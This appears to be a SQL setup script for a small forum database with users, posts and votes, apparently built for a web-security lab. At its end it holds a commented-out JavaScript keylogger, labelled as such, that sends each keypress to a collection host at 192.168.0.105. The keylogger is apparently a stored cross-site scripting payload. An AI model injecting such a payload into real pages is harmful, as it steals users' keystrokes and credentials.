drop table xvote;
drop table xposts;
drop table xusers;

create table xusers(
    uid varchar(10) primary key,
    name varchar(20));

create table xposts(
	post_id serial primary key,
	uid varchar(10) references xusers,
	text text);

create table xvote(
	uid varchar(10) references xusers,
	post_id integer references xposts(post_id),
	unique(uid,post_id));

insert into xusers values('101', 'Rishabh'), ('102', 'Akash'), ('103', 'Chinmay'), ('104', 'Ashish'), ('105', 'Aryan');

insert into xposts(uid, text) values('101', 'How do you write a good security report?'), ('102', 'What are some of the most common vulverabilities in web applications?');

insert into xvote values('104', 2), ('103', 1);
-- insert into xvote values('105', 2), ('104', 2), ('103', 1), ('105', 1);

-- document.addEventListener('keypress', function() {
-- 	console.log(arguments[0].key);
-- 	$.ajax({
-- 		type: 'GET',
-- 		url: 'http://192.168.0.105',
-- 		data: { 
-- 			'key': arguments[0].key, 
-- 		},
-- 	});
-- });
-- For keylogging

